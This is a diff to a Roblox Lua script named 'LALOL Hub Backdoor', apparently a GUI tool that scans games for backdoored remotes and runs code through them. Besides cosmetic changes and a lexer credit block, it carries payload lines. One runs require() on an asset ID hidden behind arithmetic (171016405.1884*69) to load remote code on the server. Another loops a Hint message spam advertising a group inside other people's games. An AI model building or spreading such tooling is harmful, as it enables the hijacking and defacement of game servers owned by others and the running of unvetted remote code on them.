@@ -1,4 +1,11 @@
-
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
+]=]
 
 -- Instances: 33 | Scripts: 3 | Modules: 3
 local G2L = {};
@@ -24,7 +31,8 @@ G2L["4"] = Instance.new("UIGradient", G2L["3"]);
 G2L["4"]["Rotation"] = 50;
 G2L["4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 255))};
 
-
+-- StarterGui.LALOL Hub Backdoor.Frame.UICorner
+G2L["5"] = Instance.new("UICorner", G2L["2"]);
 
 
 -- StarterGui.LALOL Hub Backdoor.Frame.Executor
@@ -70,13 +78,15 @@ G2L["b"]["Name"] = [[Clear]];
 G2L["c"] = Instance.new("TextButton", G2L["b"]);
 G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["c"]["TextSize"] = 22;
-G2L["c"]["FontFace"] = Enum.Font.Arcade
+G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
 G2L["c"]["TextColor3"] = Color3.fromRGB(36, 236, 203);
 G2L["c"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["c"]["Name"] = [[Button]];
 G2L["c"]["Text"] = [[Clear]];
 G2L["c"]["BackgroundTransparency"] = 1;
 
+-- StarterGui.LALOL Hub Backdoor.Frame.Executor.Clear.UICorner
+G2L["d"] = Instance.new("UICorner", G2L["b"]);
 
 
 -- StarterGui.LALOL Hub Backdoor.Frame.Executor.Clear.UIStroke
@@ -540,7 +550,32 @@ end;
 G2L_MODULES[G2L["14"]] = {
 Closure = function()
     local script = G2L["14"];
+--[=[
+	Lexical scanner for creating a sequence of tokens from Lua source code.
+	This is a heavily modified and Roblox-optimized version of
+	the original Penlight Lexer module:
+		https://github.com/stevedonovan/Penlight
+	Authors:
+		stevedonovan <https://github.com/stevedonovan> ----------- Original Penlight lexer author
+		ryanjmulder <https://github.com/ryanjmulder> ------------- Penlight lexer contributer
+		mpeterv <https://github.com/mpeterv> --------------------- Penlight lexer contributer
+		Tieske <https://github.com/Tieske> ----------------------- Penlight lexer contributer
+		boatbomber <https://github.com/boatbomber> --------------- Roblox port, added builtin token,
+		                                                           added patterns for incomplete syntax, bug fixes,
+		                                                           behavior changes, token optimization, thread optimization
+		                                                           Added lexer.navigator() for non-sequential reads
+		Sleitnick <https://github.com/Sleitnick> ----------------- Roblox optimizations
+		howmanysmall <https://github.com/howmanysmall> ----------- Lua + Roblox optimizations
 
+	List of possible tokens:
+		- iden
+		- keyword
+		- builtin
+		- string
+		- number
+		- comment
+		- operator
+--]=]
 
 local lexer = {}
 
@@ -1524,7 +1559,7 @@ local script = G2L["20"];
 					GUI.Scanner.Visible=false
 					makeVisible(GUI.Executor, true)
 	
-	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='CO12PT_finxzi world tour'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
+	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
 					runRemote(remote, "require(171016405.1884*69)")			
 					runRemote(remote, "a=Instance.new('Hint')a.Text='CO12PT_FINXZI JOIN TODAY'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 					
